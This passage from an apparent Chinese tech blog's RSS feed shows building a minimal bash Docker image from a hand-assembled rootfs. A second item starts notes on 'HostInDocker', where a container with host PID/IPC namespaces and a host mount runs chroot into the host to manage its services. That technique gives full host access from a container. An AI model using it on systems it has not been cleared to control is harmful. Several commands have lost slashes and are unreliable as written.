<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> run</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -it</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> jockerdragon/mini_bash:5.0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> bash</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h2>构建</h2>
<p>克隆单个分支</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">git</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> clone</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --branch</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mini_bash</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --single-branch</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> https://github.com/Paper-Dragon/docker-sh.git</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">cd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> docker-sh/</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><p>打包为docker可识别的rootfs</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">tar</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -cvf</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ../bash.tar</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B"> *</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">cd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ..</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ls</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -lh</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>压缩包近3.5M</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">-rw-r--r--</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 3.5M</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  4月</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 18</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 17:25</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> bash.tar</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>导入</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> import</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> bash.tar</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> jockerdragon/mini_bash:5.0</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sha256:7cc56da0013130d77639ffb0c137ac755d66dc39474d7321ae9642e7ebb1d0fb</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><p>运行和测试</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># docker run -it jockerdragon/mini_bash:5.0 bash</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[I have no name</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">!</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">@71d003f24aed /]#</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">!          ]]         break      command    coproc     </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">done</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">       esac       false      </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">function</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">   if</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">         local</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">      pushd</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">      return</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">     source</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">     times</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">      ulimit</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">     wait</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">./</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">         alias</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">      builtin</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    compgen</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    declare</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    echo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">       eval</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">       fc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">         getopts</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    in</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">         logout</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">     pwd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">        select</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">     suspend</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    trap</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">       umask</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">      while</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">          bash</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">       caller</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">     complete</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   dirs</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">       elif</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">       exec</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">       fg</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">         hash</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">       jobs</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">       mapfile</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    read</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">       set</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">        test</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">       true</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">       unalias</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    {</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[          bg         case       compopt    disown     </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">else</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">       exit       </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">fi</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">         help       kill       popd       readarray  shift      </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">then</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">       type       unset      }</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[[         bind       cd         continue   </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">do</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">         enable     export     for        history    let        printf     readonly   shopt      </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">time</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">       typeset    until</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[I have no name</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">!</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">@71d003f24aed /]# pwd</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">/</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[I have no name</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">!</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">@71d003f24aed /]# times</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">0m0.016s 0m0.016s</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">0m0.002s 0m0.001s</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[I have no name</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">!</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">@71d003f24aed /]#</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>制作过程</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">/lib/terminfo/x/xterm:/lib/terminfo/x/xterm</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@k8s-master:~/bash-rootfs]# ldd */*/*</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lib/terminfo/x:</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ldd:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> lib/terminfo/x:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> not</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> regular</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> file</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lib/x86_64-linux-gnu/libc-2.31.so:</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        /lib64/ld-linux-x86-64.so.2</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (0x00007f095b3dd000)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        linux-vdso.so.1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (0x00007ffd18dad000)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lib/x86_64-linux-gnu/libc.so.6:</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        /lib64/ld-linux-x86-64.so.2</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (0x00007f5b66c6e000)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        linux-vdso.so.1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (0x00007ffe385fc000)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lib/x86_64-linux-gnu/libdl-2.31.so:</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        linux-vdso.so.1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (0x00007ffeaf278000)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        libc.so.6</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> =&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/lib/x86_64-linux-gnu/libc.so.6</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (0x00007fafd2433000)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        /lib64/ld-linux-x86-64.so.2</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (0x00007fafd2634000)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lib/x86_64-linux-gnu/libdl.so.2:</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        linux-vdso.so.1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (0x00007fff1b3f6000)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        libc.so.6</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> =&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/lib/x86_64-linux-gnu/libc.so.6</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (0x00007f6332566000)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        /lib64/ld-linux-x86-64.so.2</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (0x00007f6332767000)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lib/x86_64-linux-gnu/libtinfo.so.6:</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        linux-vdso.so.1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (0x00007ffd91d81000)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        libc.so.6</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> =&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/lib/x86_64-linux-gnu/libc.so.6</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (0x00007fa907fe9000)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        /lib64/ld-linux-x86-64.so.2</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (0x00007fa908214000)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lib/x86_64-linux-gnu/libtinfo.so.6.2:</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        linux-vdso.so.1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (0x00007ffe46d77000)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        libc.so.6</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> =&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/lib/x86_64-linux-gnu/libc.so.6</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (0x00007f461ee4c000)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        /lib64/ld-linux-x86-64.so.2</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (0x00007f461f077000)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">usr/bin/bash:</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        linux-vdso.so.1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (0x00007ffd49df6000)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        libtinfo.so.6</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> =&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/lib/x86_64-linux-gnu/libtinfo.so.6</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (0x00007fd3a5d24000)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        libdl.so.2</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> =&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/lib/x86_64-linux-gnu/libdl.so.2</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (0x00007fd3a5d1e000)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        libc.so.6</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> =&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/lib/x86_64-linux-gnu/libc.so.6</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (0x00007fd3a5b2c000)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        /lib64/ld-linux-x86-64.so.2</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (0x00007fd3a5e89000)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@k8s-master:~/bash-rootfs]# docker run -it --rm  jockerdragon/bash:5.0 bash</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[I have no name</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">!</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">@d3af07f8866b /]#</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[I have no name</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">!</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">@d3af07f8866b /]#</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@k8s-master:~/bash-rootfs]# tar -cvf ../bash.tar *</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">bin/</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">bin/bash</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">etc/</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">etc/bash.bashrc</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lib/</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lib/x86_64-linux-gnu/</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lib/x86_64-linux-gnu/libc-2.31.so</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lib/x86_64-linux-gnu/libtinfo.so.6</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lib/x86_64-linux-gnu/libdl-2.31.so</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lib/x86_64-linux-gnu/libtinfo.so.6.2</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lib/x86_64-linux-gnu/libdl.so.2</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lib/x86_64-linux-gnu/libc.so.6</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lib/terminfo/</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lib/terminfo/x/</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lib/terminfo/x/xterm</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lib64/</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lib64/ld-linux-x86-64.so.2</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">usr/</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">usr/bin/</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">usr/bin/bash</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@k8s-master:~/bash-rootfs]# docker import ../bash.tar</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sha256:dfdc13f29846288fc47e830dd687e28978efc1fbf7888165a7fbf72560dcacbc</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@k8s-master:~/bash-rootfs]#</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Docker实现HostInDocker</title>
      <link>https://www.geekery.cn/note-book/Docker/Docker%E5%AE%9E%E7%8E%B0HostInDocker.html</link>
      <guid>https://www.geekery.cn/note-book/Docker/Docker%E5%AE%9E%E7%8E%B0HostInDocker.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Docker实现HostInDocker</source>
      <description>Docker实现HostInDocker 先记录过程，有空再写</description>
      <pubDate>Wed, 17 Apr 2024 07:39:12 GMT</pubDate>
      <content:encoded><![CDATA[
<p>先记录过程，有空再写</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">root@aaa-ai~#</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> run</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -it</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --ipc=host</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --pid=host</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -v</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> host</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ubuntu</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> bash</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">root@bedd413c7d54#</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> chroot</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> host</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> bash</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">root@bedd413c7d54#</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ps</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">CONTAINER</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ID</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   IMAGE</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">     COMMAND</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   CREATED</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">          STATUS</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">          PORTS</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">     NAMES</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">bedd413c7d54</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   ubuntu</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    bash</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">    19</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> seconds</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ago</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   Up</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 17</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> seconds</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">             angry_spence</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">root@bedd413c7d54#</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> status</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> nginx</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">●</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> nginx.service</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> -</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> A</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> high</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> performance</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> web</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> server</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> and</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> a</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> reverse</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> proxy</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> server</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">     Loaded</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> loaded</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (libsystemdsystemnginx.service; </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">enabled</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">; </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">vendor</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> preset</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> enabled</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">     Active</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> active</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (running) since Wed 2024-04-17 152345 CST; </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">6min</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ago</span></span>
